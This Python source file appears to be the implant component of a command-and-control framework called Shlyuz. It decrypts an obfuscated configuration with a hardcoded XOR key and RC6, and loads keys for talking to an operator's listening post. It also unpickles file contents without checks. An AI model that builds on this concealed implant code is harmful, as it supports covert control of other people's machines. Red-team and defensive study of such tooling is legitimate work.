#!/usr/bin/env python3

import ast
import pickle
import configparser

from lib import logging

from lib.crypto import asymmetric
from lib.crypto import rc6
from lib.crypto import xor


# вживлять
class Vzhivlyat(object):
    def __init__(self):
        super(Vzhivlyat, self).__init__()
        self.logging = logging.Logging(True)  # DEBUG
        self.component_id = "c41b07a940254f1d87ba60aadb93dded"  # DEBUG
        self.config_file_path = "shlyuz.conf"
        # TODO: Check if this needs to be cleared in memory
        self.config_key = xor.single_byte_xor(b'<X\x1b^\x1a\x1d?<\x1a\x05\x1d[\x05/X!', 0x69).decode('utf-8')
        self.config = configparser.RawConfigParser()
        self.config.read_string(self.decrypt_config())

        # Crypto values
        self.initial_private_key = asymmetric.private_key_from_bytes(self.config['crypto']['priv_key'])
        self.initial_public_key = self.initial_private_key.public_key
        self.initial_ts_pubkey = asymmetric.public_key_from_bytes(self.config['crypto']['lp_pk'])
        self.current_private_key = self.initial_private_key
        self.current_public_key = self.initial_public_key
        self.current_ts_pubkey = self.initial_ts_pubkey
        self.xor_key = ast.literal_eval(self.config['crypto']['xor_key'])

    def decrypt_config(self):
        with open(self.config_file_path, "rb+") as configfile:
            config_bytes = configfile.read()
            decoded_content = xor.single_byte_xor(config_bytes, 0x69)
            pickled_decoded = pickle.loads(decoded_content)
            decrypted_contents = rc6.decrypt(self.config_key, pickled_decoded)
            decrypted_config = decrypted_contents.decode('utf-8')

        del config_bytes
        del decoded_content
        del pickled_decoded
        del decrypted_contents
        return decrypted_config


vzhivlyat = Vzhivlyat()
